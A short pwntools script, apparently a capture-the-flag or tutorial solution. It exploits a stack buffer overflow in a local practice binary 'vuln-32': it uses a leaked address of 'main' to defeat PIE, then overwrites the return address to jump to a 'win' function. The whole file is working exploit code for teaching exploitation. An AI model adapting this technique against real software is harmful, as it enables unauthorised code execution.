#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

p.recvuntil(b'at: ')

print(elf.sym['main'])

MAIN = int(p.recvline(), 16)
elf.address = MAIN - elf.sym['main']

offset = 32

payload = flat(
    b'A' * offset,
    elf.sym['win']
)

p.sendline(payload)

print(p.clean().decode('latin-1'))
